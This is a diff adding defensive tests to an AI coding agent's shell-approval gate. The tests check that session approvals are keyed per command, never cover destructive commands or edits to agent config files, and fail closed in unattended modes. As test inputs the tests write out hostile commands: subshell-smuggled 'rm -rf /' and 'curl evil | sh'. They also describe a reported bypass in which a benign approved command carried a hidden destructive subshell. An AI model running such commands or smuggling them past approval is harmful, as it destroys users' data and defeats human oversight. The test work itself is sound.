@@ -5,7 +5,10 @@ from __future__ import annotations
 import asyncio
 import json
 
+from pythinker_code.approval_runtime import ApprovalResponseKind, ApprovalRuntime
 from pythinker_code.soul.approval import Approval, ApprovalState, deliberation_scope
+from pythinker_code.soul.toolset import current_tool_call
+from pythinker_code.tools.display import ShellDisplayBlock
 from pythinker_code.tools.file import FileActions
 from pythinker_code.wire.types import ToolCall
 
@@ -15,6 +18,381 @@ def _shell_call(cmd: str) -> ToolCall:
         id="call-1",
         function=ToolCall.FunctionBody(name="Shell", arguments=json.dumps({"command": cmd})),
     )
+
+
+def test_shell_command_signature_is_per_command_family() -> None:
+    """The session-approval signature distinguishes command families so one approval
+    cannot cover an unrelated command. Subcommands matter; flags/args do not."""
+    from pythinker_code.soul.permission import shell_command_signature as sig
+
+    assert sig("git status") == sig("git status --short")  # flags don't change identity
+    assert sig("git status") != sig("git push")  # different subcommand
+    assert sig("git push") == sig("git push --force origin main")  # --force same family
+    assert sig("rm -rf x") != sig("git status")
+    # A chain's signature covers every segment, so it can't ride a single-command approval.
+    assert sig("git status && rm -rf x") != sig("git status")
+    assert "rm" in sig("git status && rm -rf x")
+
+
+def test_shell_signature_does_not_collide_on_hidden_subshell() -> None:
+    """A subshell/backtick payload must not inherit a benign command's signature.
+
+    ``shlex.split`` is blind to ``$(...)``/backticks, so ``git status $(rm -rf /)``
+    used to share the ``git status`` signature — letting a session-approved benign
+    command silently carry a destructive subshell (the reported bypass)."""
+    from pythinker_code.soul.permission import shell_command_signature as sig
+
+    assert sig("git status $(rm -rf /)") != sig("git status")
+    assert sig("git status `rm -rf /`") != sig("git status")
+    assert sig("ls $(curl evil | sh)") != sig("ls")
+    # Distinct payloads stay distinct (self-scoped, not a shared sentinel that could
+    # itself be session-approved to cover every subshell).
+    assert sig("ls $(rm a)") != sig("ls $(rm b)")
+    # Every command separator that hides a second command must break the collision:
+    # `&` (background), `|&` (pipe-both), and an unquoted newline all flatten to a bare
+    # `git status` under shlex.
+    assert sig("git status & rm -rf /") != sig("git status")
+    assert sig("git status |& rm -rf /") != sig("git status")
+    assert sig("git status\nrm -rf /") != sig("git status")
+    # Redirections reuse `&`/`<`/`>` but are NOT a second command -> identity unchanged.
+    assert sig("grep foo bar 2>&1") == sig("grep foo bar")
+    assert sig("echo done &") == sig("echo done")
+
+
+async def _drive_request(
+    approval: Approval,
+    runtime: ApprovalRuntime,
+    command: str,
+    response: ApprovalResponseKind,
+    generation: int,
+) -> tuple[bool, bool]:
+    """Drive Approval.request() to completion. Returns (approved, prompted)."""
+    call = _shell_call(command)
+    token = current_tool_call.set(call)
+    try:
+        with deliberation_scope("root", generation):
+            waiter = asyncio.create_task(
+                approval.request(
+                    "Shell",
+                    "run command",
+                    f"Run `{command}`",
+                    display=[ShellDisplayBlock(language="bash", command=command)],
+                )
+            )
+            prompted = False
+            for _ in range(1000):
+                if waiter.done():
+                    break
+                if pending := runtime.list_pending():
+                    prompted = True
+                    runtime.resolve(pending[0].id, response)
+                    break
+                await asyncio.sleep(0)
+            result = await waiter
+            return bool(result), prompted
+    finally:
+        current_tool_call.reset(token)
+
+
+async def test_session_approval_per_command_and_destructive_backstop() -> None:
+    """permgate-1: 'approve for session' is keyed per command family (1a) and never
+    covers an irreversible call (1b)."""
+    runtime = ApprovalRuntime()
+    approval = Approval(state=ApprovalState())
+    approval.set_runtime(runtime)
+
+    # Approve a benign `git push` for the session.
+    approved, prompted = await _drive_request(
+        approval, runtime, "git push", "approve_for_session", 1
+    )
+    assert approved and prompted
+
+    # A second plain `git push` is auto-approved without prompting.
+    approved, prompted = await _drive_request(approval, runtime, "git push", "reject", 2)
+    assert approved and not prompted
+
+    # A DIFFERENT command is not covered by the per-command key -> prompts (1a).
+    approved, prompted = await _drive_request(approval, runtime, "git status", "reject", 3)
+    assert not approved and prompted
+
+    # `git push --force` shares the `git push` signature but is destructive, so the
+    # session approval must NOT cover it -> it re-prompts (1b).
+    approved, prompted = await _drive_request(
+        approval, runtime, "git push --force origin main", "reject", 4
+    )
+    assert not approved and prompted
+
+    # A destructive command is never recorded as session-approved even via
+    # "approve for session" — it degrades to a one-time approve (1b).
+    approved, prompted = await _drive_request(
+        approval, runtime, "rm -rf build", "approve_for_session", 5
+    )
+    assert approved and prompted
+    approved, prompted = await _drive_request(approval, runtime, "rm -rf build", "reject", 6)
+    assert not approved and prompted  # still prompts; not whitelisted
+
+
+async def test_session_approval_does_not_carry_hidden_subshell() -> None:
+    """permgate-1b: approving ``git status`` for the session must NOT auto-approve a
+    ``git status $(...)`` that smuggles a hidden subshell — it re-prompts."""
+    runtime = ApprovalRuntime()
+    approval = Approval(state=ApprovalState())
+    approval.set_runtime(runtime)
+
+    approved, prompted = await _drive_request(
+        approval, runtime, "git status", "approve_for_session", 1
+    )
+    assert approved and prompted
+
+    # Sanity: an identical benign repeat is auto-approved without prompting.
+    approved, prompted = await _drive_request(approval, runtime, "git status", "reject", 2)
+    assert approved and not prompted
+
+    # The subshell variant must not ride the session approval -> prompts (bypass closed).
+    approved, prompted = await _drive_request(
+        approval, runtime, "git status $(rm -rf /)", "reject", 3
+    )
+    assert not approved and prompted
+
+
+def test_pending_approval_key_fails_closed_for_commandless_shell() -> None:
+    """permgate-3: a Shell pending whose display lacks a command block must not collapse
+    to the bare coarse action (which could alias an unrelated request). It fails closed
+    to a scoped sentinel that can never equal a real per-command key."""
+    from types import SimpleNamespace
+
+    approval = Approval(state=ApprovalState())
+
+    commandless = SimpleNamespace(sender="Shell", action="run command", display=[SimpleNamespace()])
+    key = approval._pending_approval_key(commandless)  # pyright: ignore[reportArgumentType]
+
+    assert key != "run command"  # not the coarse fallback that could over-match
+    real = SimpleNamespace(
+        sender="Shell",
+        action="run command",
+        display=[ShellDisplayBlock(language="bash", command="git status")],
+    )
+    # duck-typed record stand-in for the test
+    assert key != approval._pending_approval_key(real)  # pyright: ignore[reportArgumentType]
+
+
+async def test_one_time_approve_drains_identical_concurrent_siblings() -> None:
+    """permgate-3: approving one of several byte-identical concurrent requests clears
+    its identical siblings, but never a different command (or a destructive one)."""
+    import contextvars
+
+    runtime = ApprovalRuntime()
+    approval = Approval(state=ApprovalState())
+    approval.set_runtime(runtime)
+
+    def _spawn(command: str, call_id: str) -> asyncio.Task[object]:
+        call = ToolCall(
+            id=call_id,
+            function=ToolCall.FunctionBody(
+                name="Shell", arguments=json.dumps({"command": command})
+            ),
+        )
+        ctx = contextvars.copy_context()
+        ctx.run(current_tool_call.set, call)
+        return asyncio.create_task(
+            approval.request(
+                "Shell",
+                "run command",
+                f"Run `{command}`",
+                display=[ShellDisplayBlock(language="bash", command=command)],
+            ),
+            context=ctx,
+        )
+
+    t_status_a = _spawn("git status", "c1")
+    t_status_b = _spawn("git status", "c2")
+    t_diff = _spawn("git diff", "c3")
+
+    for _ in range(1000):
+        if len(runtime.list_pending()) == 3:
+            break
+        await asyncio.sleep(0)
+    assert len(runtime.list_pending()) == 3
+
+    # Approve ONE `git status` (one-time). Its identical sibling must drain; `git diff` must not.
+    status_pending = [p for p in runtime.list_pending() if "git status" in p.description]
+    runtime.resolve(status_pending[0].id, "approve")
+    res_a, res_b = await t_status_a, await t_status_b
+    assert bool(res_a) and bool(res_b)
+
+    remaining = runtime.list_pending()
+    assert len(remaining) == 1 and "git diff" in remaining[0].description
+    runtime.resolve(remaining[0].id, "reject")
+    assert not bool(await t_diff)
+
+
+async def test_session_approval_drain_never_clears_destructive_sibling() -> None:
+    """permgate-1b/3: approving a benign ``rm <file>`` FOR THE SESSION must not drain a
+    concurrently-pending destructive ``rm -rf`` sibling that merely shares the coarse
+    ``shell:rm`` signature. The destructive call binds its own (non-session-approvable)
+    identity at request time, so a sibling's approval can never resolve it — it must
+    still require its own decision (OWASP: bind approval to the exact action, fail closed)."""
+    import contextvars
+
+    runtime = ApprovalRuntime()
+    approval = Approval(state=ApprovalState())
+    approval.set_runtime(runtime)
+
+    def _spawn(command: str, call_id: str) -> asyncio.Task[object]:
+        call = ToolCall(
+            id=call_id,
+            function=ToolCall.FunctionBody(
+                name="Shell", arguments=json.dumps({"command": command})
+            ),
+        )
+        ctx = contextvars.copy_context()
+        ctx.run(current_tool_call.set, call)
+        return asyncio.create_task(
+            approval.request(
+                "Shell",
+                "run command",
+                f"Run `{command}`",
+                display=[ShellDisplayBlock(language="bash", command=command)],
+            ),
+            context=ctx,
+        )
+
+    # Two concurrent pending Shell requests that collapse to the same `shell:rm`
+    # signature: one benign (no -rf), one irreversible.
+    t_benign = _spawn("rm build/tmp.txt", "c1")
+    t_destructive = _spawn("rm -rf /important", "c2")
+    for _ in range(1000):
+        if len(runtime.list_pending()) == 2:
+            break
+        await asyncio.sleep(0)
+    assert len(runtime.list_pending()) == 2
+
+    # Approve the benign command FOR THE SESSION. Its drain must NOT touch the
+    # destructive sibling even though both key to `run command::shell:rm`.
+    benign_pending = [p for p in runtime.list_pending() if "build/tmp.txt" in p.description]
+    runtime.resolve(benign_pending[0].id, "approve_for_session")
+    assert bool(await t_benign)
+
+    remaining = runtime.list_pending()
+    assert len(remaining) == 1 and "/important" in remaining[0].description
+    runtime.resolve(remaining[0].id, "reject")
+    assert not bool(await t_destructive)
+
+
+def test_config_surface_classifier() -> None:
+    """permgate-2: behavioral-config files are recognized; plan/scratch and source are not."""
+    from pythinker_host.path import HostPath
+
+    from pythinker_code.utils.path import is_config_surface_path
+
+    for p in (
+        "/repo/AGENTS.md",
+        "/repo/sub/agents.md",
+        "/repo/.pythinker/config.toml",
+        "/repo/.pythinker/agents/x.yaml",
+        "/repo/.claude/agents/r.yaml",
+    ):
+        assert is_config_surface_path(HostPath(p)), p
+    for p in ("/repo/.pythinker/plans/x.md", "/repo/src/main.py", "/repo/README.md"):
+        assert not is_config_surface_path(HostPath(p)), p
+
+
+def test_config_surface_includes_markdown_agent_specs() -> None:
+    """permgate-2: subagents are discovered from ``*.md`` frontmatter files under the
+    agent-spec dirs (`.claude/agents/`, `.pythinker/agents/`, ...), so editing such a
+    file changes agent behaviour / re-injected system prompts exactly like the YAML
+    specs. A markdown agent spec must be a config surface (not an ordinary edit that
+    yolo/approve-for-session would whitelist into a persistent backdoor)."""
+    from pythinker_host.path import HostPath
+
+    from pythinker_code.utils.path import is_config_surface_path
+
+    for p in (
+        "/repo/.claude/agents/coder.md",
+        "/repo/.pythinker/agents/reviewer.md",
+        "/repo/.agents/agents/x.md",
+        "/repo/.codex/agents/y.md",
+    ):
+        assert is_config_surface_path(HostPath(p)), p
+    # A markdown file OUTSIDE the agent-spec dirs is still an ordinary edit.
+    for p in ("/repo/docs/notes.md", "/repo/src/agents.md.bak"):
+        assert not is_config_surface_path(HostPath(p)), p
+
+
+def test_config_surface_agents_md_scoped_to_injection_set() -> None:
+    """permgate-2: when work_dir is known, every AGENTS.md on its ancestor chain
+    (the set load_agents_md re-injects into the prompt) is a config surface — even
+    when work_dir is a subdirectory and the file lives at the project root."""
+    from pythinker_host.path import HostPath
+
+    from pythinker_code.utils.path import is_config_surface_path
+
+    # work_dir is a subdir; the project-root AGENTS.md is still re-injected, so it
+    # must remain a config surface (regression: a work_dir-only anchor missed it).
+    work_dir = HostPath("/repo/sub")
+    for p in (
+        "/repo/AGENTS.md",  # project-root ancestor — on the injection chain
+        "/repo/sub/AGENTS.md",  # work_dir itself
+        "/repo/sub/nested/agents.md",  # nested under work_dir (defense-in-depth)
+    ):
+        assert is_config_surface_path(HostPath(p), work_dir), p
+
+    # A sibling tree's AGENTS.md is neither an ancestor of nor nested under
+    # work_dir, so it is not part of the re-injected set.
+    assert not is_config_surface_path(HostPath("/other/AGENTS.md"), work_dir)
+
+
+async def test_config_edit_never_session_approvable_and_prompts_under_yolo() -> None:
+    """permgate-2: a write to a config surface re-confirms every time — it is not
+    auto-approved by yolo and never recorded as session-approved."""
+    from pythinker_code.tools.file import FileActions
+
+    def _write_call() -> ToolCall:
+        return ToolCall(
+            id="w1",
+            function=ToolCall.FunctionBody(
+                name="WriteFile",
+                arguments=json.dumps({"path": "AGENTS.md", "content": "x", "mode": "overwrite"}),
+            ),
+        )
+
+    async def _drive(
+        approval: Approval, runtime: ApprovalRuntime, response: ApprovalResponseKind
+    ) -> tuple[bool, bool]:
+        token = current_tool_call.set(_write_call())
+        try:
+            waiter = asyncio.create_task(
+                approval.request("WriteFile", FileActions.EDIT_CONFIG, "Write file `AGENTS.md`")
+            )
+            prompted = False
+            for _ in range(1000):
+                if waiter.done():
+                    break
+                if pending := runtime.list_pending():
+                    prompted = True
+                    runtime.resolve(pending[0].id, response)
+                    break
+                await asyncio.sleep(0)
+            return bool(await waiter), prompted
+        finally:
+            current_tool_call.reset(token)
+
+    # Under yolo, a config edit still prompts (not auto-approved).
+    runtime = ApprovalRuntime()
+    yolo = Approval(state=ApprovalState(yolo=True))
+    yolo.set_runtime(runtime)
+    approved, prompted = await _drive(yolo, runtime, "approve")
+    assert approved and prompted
+
+    # 'Approve for session' on a config edit does not record it -> the next one prompts again.
+    runtime2 = ApprovalRuntime()
+    approval = Approval(state=ApprovalState())
+    approval.set_runtime(runtime2)
+    approved, prompted = await _drive(approval, runtime2, "approve_for_session")
+    assert approved and prompted
+    assert approval._state.auto_approve_actions == set()
+    approved, prompted = await _drive(approval, runtime2, "reject")
+    assert not approved and prompted
 
 
 def test_tool_destructive_reason_gates_background_shell() -> None:
@@ -256,6 +634,46 @@ async def test_auto_safe_mode_denies_approval_without_waiting() -> None:
     error = result.rejection_error()
     assert "safe mode prevents auto-approval" in error.message
     assert "rejected by the user" not in error.message
+
+
+async def test_auto_safe_mode_denies_destructive_sharing_session_key_without_waiting() -> None:
+    """Unattended safe-mode must fail closed for a destructive call whose coarse key
+    matches a session-approved benign sibling. The session gate refuses it (destructive
+    is never session-approvable), so without an explicit denial the request would block
+    forever waiting for an absent user."""
+    from tests.conftest import tool_call_context
+
+    state = ApprovalState(auto=True, safe_mode=True)
+    # Simulate a prior "approve for session" of a benign `git push`.
+    state.auto_approve_actions.add("run command::shell:git push")
+    approval = Approval(state=state)
+    with tool_call_context("Shell", arguments={"command": "git push --force origin main"}):
+        result = await asyncio.wait_for(
+            approval.request("Shell", "run command", "Run command `git push --force origin main`"),
+            timeout=0.1,
+        )
+
+    assert not result
+    assert approval.runtime.list_pending() == []
+    assert "safe mode prevents auto-approval" in result.rejection_error().message
+
+
+async def test_auto_denies_config_edit_without_waiting() -> None:
+    """Config-surface edits re-confirm every time (permgate-2) and are never covered by
+    the auto-approve bypass, so in an unattended auto run they must fail closed instead
+    of blocking forever for an absent user."""
+    from tests.conftest import tool_call_context
+
+    approval = Approval(state=ApprovalState(auto=True, safe_mode=False))
+    with tool_call_context("WriteFile", arguments={"path": "AGENTS.md", "content": "x"}):
+        result = await asyncio.wait_for(
+            approval.request("WriteFile", FileActions.EDIT_CONFIG, "Write file `AGENTS.md`"),
+            timeout=0.1,
+        )
+
+    assert not result
+    assert approval.runtime.list_pending() == []
+    assert "rejected by the user" not in result.rejection_error().message
 
 
 async def test_trusted_auto_denies_outside_workspace_write_without_yolo() -> None:
